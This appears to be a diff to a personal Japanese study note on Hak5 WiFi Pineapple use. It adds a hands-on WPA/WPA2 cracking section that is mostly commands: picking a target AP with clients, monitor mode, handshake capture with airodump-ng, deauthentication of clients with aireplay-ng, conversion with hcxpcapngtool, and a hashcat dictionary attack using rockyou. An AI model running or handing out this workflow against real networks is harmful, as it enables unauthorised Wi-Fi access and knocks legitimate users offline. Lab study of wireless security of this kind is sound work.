@@ -88,6 +88,23 @@ tags: [Hak5, WiFi-Pineapple, Study With, DNS Spoofing]
    - パスワードクラック: `hashcat -m 22000 -a 0 -w 3 handshake.hccapx /usr/share/wordlists/rockyou.txt`
    - ![alt text](../assets/images/2025-02-07_16-49.png)
 
+## WPA/WPA2 Crack: 実践
+
+- Recon on WiFi Pineapple
+- Targetの選定: 
+  - WPA2 PSK (CCMP)やWPA Mixed PSK (CCMP)を利用している。
+  - 電波強度が強い（Signalが高い）: -80dBm以下だとパケットロスが多く、Deauthやキャプチャが不安定になる。理想は**-60dBm前後**
+  - クライアント（接続デバイス）がいる
+- モニターモード有効化: `airmon-ng start wlan1`
+- ターゲットAPのチャンネルを固定: `iwconfig wlan1mon channel 3`
+- キャプチャ: `tcpdump -i wlan1mon -w /sd/practice.pcap` or `airodump-ng --bssid XX:XX:XX:XX:XX:XX -c 3 -w handshake wlan1mon`
+- Deauth: UI or `aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX wlan1mon`
+- キャプチャファイルの移動(PS上): `scp root@172.16.42.1:/sd/practice.pcap C:\Users\ebisu\Desktop\`
+- Wireshrkで`eapol`を確認し保存: `eapol7`
+- Hashcatでクラック
+   - .pcap ファイル ⇢ .hccapxファイルへ: `hcxpcapngtool -o handshake.hccapx capture.pcap`
+   - パスワードクラック: `hashcat -m 22000 -a 0 -w 3 handshake.hccapx /usr/share/wordlists/rockyou.txt`
+   - ![alt text](../assets/images/2025-02-07_16-49.png)
 
 ## DNS Spoofing
 
